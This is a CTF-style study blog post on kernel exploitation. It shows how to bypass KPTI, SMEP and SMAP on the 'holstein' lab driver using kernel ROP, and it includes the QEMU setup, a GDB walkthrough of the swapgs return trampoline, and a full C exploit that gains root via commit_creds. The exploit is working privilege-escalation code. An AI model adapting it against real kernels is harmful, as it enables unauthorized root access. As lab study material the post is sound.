---
title: "[KERNEL] KROP_(KPTI bypass)"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP. #!/bin/shqemu-system-x86_64 \\ -m 64M \\ -nographic \\ -kernel bzImage \\ -append \"console=ttyS"
date: "2024-06-28"
translation_key: "tistory-1988ea5328ae"
tags: ["STUDY/KERNEL"]
category: "STUDY/KERNEL"
source_url: "https://whrdud727.tistory.com/entry/KERNEL-KROPKPTI-bypass"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※****

  
  

This time, we will cover KROP, which bypasses the KPTI protection technique along with SMEP and SMAP.

```
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr pti=on" \
    -no-reboot \
    -cpu qemu64,+smep,+smap \
    -smp 1 \
    -monitor /dev/null \
    -initrd debugfs.cpio \
    -net nic,model=virtio \
    -net user \
    -gdb tcp::12345
```

Modify run.sh as above.

+smep : Enable smep

+smap : Activate smap

\-append "... pti=on ..." : Activate kpti

![](/assets/images/tistory/tistory-1988ea5328ae/001.png)

When I ran the KROP binary I created previously, a Segment fault was displayed.

[https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass](https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass)

 [\[KERNEL\] KROP\_(SMEP bypass)

※ If there are any mistakes, please let me know. We will check and correct it. ※ In the user area, ROP was used to bypass the NX-BIT protection technique. ROP in the kernel area also uses a protection technique called SMEP.

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/KERNEL-KROPSMEP-bypass)

To bypass this, the CR3 register must be modulated.

CR3 register: This is a register referenced when returning to the user area after processing a task in the kernel area.

This is used to differentiate the accessible memory area in the user area from the accessible memory area in the kernel area. There is a representative macro related to this.

```
swapgs_restore_regs_and_return_to_usermode
```

```
	POP_REGS pop_rdi=0

	/*
	 * The stack is now user RDI, orig_ax, RIP, CS, EFLAGS, RSP, SS.
	 * Save old stack pointer and switch to trampoline stack.
	 */
	movq	%rsp, %rdi
	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp
	UNWIND_HINT_EMPTY

	/* Copy the IRET frame to the trampoline stack. */
	pushq	6*8(%rdi)	/* SS */
	pushq	5*8(%rdi)	/* RSP */
	pushq	4*8(%rdi)	/* EFLAGS */
	pushq	3*8(%rdi)	/* CS */
	pushq	2*8(%rdi)	/* RIP */

	/* Push user RDI on the trampoline stack. */
	pushq	(%rdi)

	/*
	 * We are on the trampoline stack.  All regs except RDI are live.
	 * We can do future final exit work right here.
	 */
	STACKLEAK_ERASE_NOCLOBBER

	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi

	/* Restore RDI. */
	popq	%rdi
	SWAPGS
	INTERRUPT_RETURN
```

The part to be careful about in this code is \[SWITCH\_TO\_USER\_CR3\_STACK scratch\_reg=%rdi\].

![](/assets/images/tistory/tistory-1988ea5328ae/002.png)

Check the location of the macro for debugging.

```
gdb
gef-remote localhost 12345
x/32gi 0xffffffff81800e10
```

![](/assets/images/tistory/tistory-1988ea5328ae/003.png)

![](/assets/images/tistory/tistory-1988ea5328ae/004.png)

![](/assets/images/tistory/tistory-1988ea5328ae/005.png)

This is the part where the CR3 register is manipulated. If the CR3 register is manipulated, it becomes impossible to retrieve and restore data from the stack in the kernel after iretq. 

![](/assets/images/tistory/tistory-1988ea5328ae/006.png)

Looking at the code a little further, there is some work to build a stack frame before manipulating CR3.

→ Afterwards, pop rax at 0xffffffff81800e7f; pop rdi; carry out

→ swapgs at 0xffffffff81800eb0; iretq; carry out

→ rip, cs, rflags, rsp, ss can be set

If you take the above addresses and write the exploit code, it is as follows.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rsp, user_rflags;
unsigned long prepare_kernel_cred = 0xffffffff8106e240;
unsigned long commit_creds = 0xffffffff8106e390;
#define prdi  0xffffffff8127bbdc
#define prsi  0xffffffff8101ccde
#define prdx  0xffffffff81146092
#define prcx  0xffffffff812ea083
#define mrdi  0xffffffff8160c96b
#define swapgs  0xffffffff8160bf7e
#define iretq  0xffffffff810202af
#define rtu 0xffffffff81800e26

static void win() {
        char *argv[] = { "/bin/sh", NULL };
        char *evnp[] = { NULL };
        puts("[+] win!");
        execve("/bin/sh", argv, evnp);
}

static void save_state() {
        asm(
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "movq %%rsp, %2\n"
            "pushfq\n"
            "popq %3\n"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags
)
	  :
      : "memory");
}

int main() {
    save_state();
    int fd = open("/dev/holstein", 2);

    char buf[0x500];
    memset(buf, 'A', 0x408);
    
    //commit_cred(prepare_kernel_cred(NULL)) 구현하기
    unsigned long *payload = (unsigned long*)&buf[0x408];
    *payload++ = prdi;
    *payload++ = 0;
    *payload++ = prepare_kernel_cred;
    *payload++ = prcx;
    *payload++ = 0; //rep 명령어 때문에 추가한 부분 -> rcx를 0으로 두어 반복을 안하기 위함
    *payload++ = mrdi;
    *payload++ = commit_creds;
    *payload++ = rtu;
    *payload++ = 0xdeadbeef;
    *payload++ = 0xdeadbeef;
    *payload++ = (unsigned long*)&win;
    *payload++ = user_cs;
    *payload++ = user_rflags;
    *payload++ = user_rsp;
    *payload++ = user_ss;
    
    write(fd,buf, (void*)payload - (void*)buf);

    close(fd);
    return 0;
}
```

```
gcc kpti.c -o kpti --static
cp kpti ./root/
cd root
find . -print0 | cpio -o --null --format=newc --owner=root > ../debugfs.cpio
cd ..
sh run.sh
```

![](/assets/images/tistory/tistory-1988ea5328ae/007.png)

This time, you can see that privilege elevation was successful.